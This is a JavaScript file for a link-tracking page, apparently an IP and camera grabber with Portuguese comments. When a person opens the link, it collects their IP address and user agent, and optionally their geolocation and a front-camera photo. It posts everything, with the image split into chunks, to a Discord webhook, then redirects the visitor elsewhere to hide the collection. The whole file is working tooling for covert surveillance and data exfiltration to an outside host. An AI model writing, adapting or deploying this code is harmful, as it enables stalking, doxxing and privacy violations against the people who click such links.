(async () => {
  const cfg = window.OSINT_CONFIG || {};
  const qs = new URLSearchParams(window.location.search);

  const log = (...args) => {
    if (cfg.debug || qs.get("debug") === "1") {
      const box = document.getElementById("debugBox");
      box.style.display = "block";
      box.textContent += args.map(a => (typeof a === 'object' ? JSON.stringify(a, null, 2) : a)).join(" ") + "\n";
    }
    console.log(...args);
  };

  const getParam = (key, fallback) => {
    if (qs.has(key)) return qs.get(key);
    return cfg[key] ?? fallback;
  };

  const webhookUrl = getParam("webhookUrl", "");
  const finalUrl = getParam("r", cfg.finalUrl);
  const requestCamera = getParam("cam", cfg.requestCamera) == "1";
  const requestGeo = getParam("geo", cfg.requestGeo) == "1";
  const redirectDelay = parseInt(getParam("delay", cfg.redirectDelayMs), 10);
  const splitImage = getParam("split", cfg.splitImage) == "1";
  const chunkSize = parseInt(getParam("chunkSize", cfg.chunkSize), 10);

  log("Webhook:", webhookUrl);
  log("Destino:", finalUrl);

  const data = { when: new Date().toString(), location: null, ip: null, userAgent: navigator.userAgent };
  let blob = null;

  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    data.ip = (await ipRes.json()).ip;
  } catch (e) {
    log("Erro ao obter IP:", e);
  }

  // Geolocalização
  if (requestGeo && navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
      data.location = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy
      };
    } catch (e) {
      log("Geo negado:", e.message);
    }
  }

  // Câmera frontal
  if (requestCamera && navigator.mediaDevices?.getUserMedia) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg"));
      stream.getTracks().forEach(t => t.stop());
    } catch (e) {
      log("Câmera negada ou falhou:", e.message);
    }
  }

  // Função para dividir imagem em partes
  const splitImageFunc = async (imageBlob) => {
    const chunks = [];
    const arrayBuffer = await imageBlob.arrayBuffer();
    const totalSize = arrayBuffer.byteLength;
    
    log("Tamanho da imagem:", totalSize, "bytes");
    log("Tamanho máximo do chunk:", chunkSize, "bytes");
    
    for (let i = 0; i < totalSize; i += chunkSize) {
      const chunk = arrayBuffer.slice(i, i + chunkSize);
      chunks.push(new Blob([chunk], { type: 'image/jpeg' }));
      log("Criado chunk", chunks.length, "tamanho:", chunk.byteLength);
    }
    
    return chunks;
  };

  // Enviar chunks separadamente
  const sendImageChunks = async (chunks) => {
    for (let i = 0; i < chunks.length; i++) {
      const chunkPayload = `**IP:** ${data.ip || "N/A"}\n` +
        `**User-Agent:** ${data.userAgent}\n` +
        `**Localização:** ${data.location ? `${data.location.lat}, ${data.location.lon} (±${data.location.acc}m)` : "N/A"}\n` +
        `**Hora:** ${data.when}\n` +
        `**Parte:** ${i + 1}/${chunks.length}`;
      
      const form = new FormData();
      form.append("payload_json", JSON.stringify({ content: chunkPayload }));
      form.append("file", chunks[i], `cam_part${i + 1}.jpg`);
      
      try {
        const response = await fetch(webhookUrl, { method: "POST", body: form });
        log("Status do chunk", i + 1, ":", response.status, response.statusText);
        
        if (response.ok) {
          log("Chunk", i + 1, "enviado com sucesso!");
        } else {
          log("Erro no chunk", i + 1, "-", response.status, response.statusText);
        }
        
        // Pequeno delay entre envios para não sobrecarregar
        await new Promise(resolve => setTimeout(resolve, 1000));
        
      } catch (e) {
        log("Erro ao enviar chunk", i + 1, ":", e.message);
      }
    }
  };

  const payload = `**IP:** ${data.ip || "N/A"}\n` +
    `**User-Agent:** ${data.userAgent}\n` +
    `**Localização:** ${data.location ? `${data.location.lat}, ${data.location.lon} (±${data.location.acc}m)` : "N/A"}\n` +
    `**Hora:** ${data.when}`;

  if (webhookUrl.startsWith("https://discord.com/api/webhooks/") || webhookUrl.startsWith("https://discordapp.com/api/webhooks/")) {
    if (blob) {
      if (splitImage) {
        // Dividir imagem e enviar em partes
        log("Dividindo imagem em partes (splitImage=true)...");
        const chunks = await splitImageFunc(blob);
        log("Total de chunks:", chunks.length);
        
        if (chunks.length > 1) {
          log("Enviando imagem em", chunks.length, "partes...");
          await sendImageChunks(chunks);
        } else {
          log("Imagem pequena, enviando normal...");
          // Imagem pequena, enviar normal
          const form = new FormData();
          form.append("payload_json", JSON.stringify({ content: payload }));
          form.append("file", blob, "cam.jpg");
          
          try {
            const response = await fetch(webhookUrl, { method: "POST", body: form });
            log("Status do envio:", response.status, response.statusText);
            if (response.ok) {
              log("Enviado ao Discord com sucesso!");
            } else {
              log("Erro no Discord - Status:", response.status, response.statusText);
              const errorText = await response.text();
              log("Resposta de erro:", errorText);
            }
          } catch (e) {
            log("Erro ao enviar para webhook:", e.message);
            log("Erro completo:", e);
          }
        }
      } else {
        log("Enviando imagem inteira (splitImage=false)...");
        // Enviar imagem inteira
        const form = new FormData();
        form.append("payload_json", JSON.stringify({ content: payload }));
        form.append("file", blob, "cam.jpg");
        
        try {
          const response = await fetch(webhookUrl, { method: "POST", body: form });
          log("Status do envio:", response.status, response.statusText);
          if (response.ok) {
            log("Enviado ao Discord com sucesso!");
          } else {
            log("Erro no Discord - Status:", response.status, response.statusText);
            const errorText = await response.text();
            log("Resposta de erro:", errorText);
          }
        } catch (e) {
          log("Erro ao enviar para webhook:", e.message);
          log("Erro completo:", e);
        }
      }
    } else {
      // Sem imagem, enviar apenas texto
      log("Sem imagem, enviando apenas texto...");
      const form = new FormData();
      form.append("payload_json", JSON.stringify({ content: payload }));
      
      try {
        const response = await fetch(webhookUrl, { method: "POST", body: form });
        log("Status do envio:", response.status, response.statusText);
        if (response.ok) {
          log("Enviado ao Discord com sucesso!");
        } else {
          log("Erro no Discord - Status:", response.status, response.statusText);
          const errorText = await response.text();
          log("Resposta de erro:", errorText);
        }
      } catch (e) {
        log("Erro ao enviar para webhook:", e.message);
        log("Erro completo:", e);
      }
    }
  } else {
    log("URL do webhook inválido:", webhookUrl);
  }

  setTimeout(() => window.location.href = finalUrl, redirectDelay);
})();
